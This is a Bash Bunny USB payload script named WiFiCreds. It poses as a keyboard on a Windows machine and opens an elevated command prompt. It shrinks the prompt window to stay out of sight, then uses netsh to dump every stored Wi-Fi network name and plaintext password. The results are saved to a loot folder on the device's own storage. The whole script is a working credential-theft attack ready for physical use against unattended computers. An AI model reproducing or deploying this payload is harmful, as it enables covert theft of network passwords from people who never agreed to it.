#!/bin/bash
#
# Title:         WiFiCreds
# Author:        illwill
# Version:       0.2
#
# Dumps the stored plaintext Wifi SSID & passwords from Windows boxes using Powershell
# then stashes them in /root/udisk/loot/WiFiCreds
#
# Blue...............Running Script
# Purple.............Got WiFi Creds

# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
source bunny_helpers.sh

LED R 200
LOOTDIR=/root/udisk/loot/WiFiCreds
mkdir -p $LOOTDIR

ATTACKMODE HID STORAGE
LED B 200
Q GUI
Q DELAY 100
Q STRING CMD
Q DELAY 400
Q CTRL-SHIFT ENTER
Q DELAY 2500
Q LEFTARROW
Q DELAY 100
Q ENTER
Q DELAY 1000
Q STRING mode con:cols=18 lines=1
Q ENTER
Q DELAY 100
Q STRING for \/f "%D" in \(\'wmic LogicalDisk get Caption\^\, VolumeName \^\| find \"BashBunny\"\'\) do set BUNNY\=\%D
Q ENTER
Q DELAY 100
Q STRING echo. \& for \/f \"tokens\=4 delims\=: \" \%a in \(\'netsh wlan show profiles "^"\| find \"Profile \"\'\) d 
Q STRING o \@echo off \> nul \& \(netsh wlan show profiles name\=\%a key\=clear \| findstr \"SSID Content Authentication\" \| find \/v \"Number\" \& echo.\) \>\>\%BUNNY\%\\loot\\WifiCreds\\\%COMPUTERNAME%\.txt
Q ENTER
Q DELAY 100
Q STRING echo.\>\%BUNNY\%\\loot\\WifiCreds\\DONE
Q ENTER
Q DELAY 100
Q STRING EXIT
Q ENTER
Q DELAY 10000
sync

if [ -f "$LOOTDIR/DONE"  ]; then
   rm "$LOOTDIR/DONE"
   LED R B 200
else
   LED R
fi
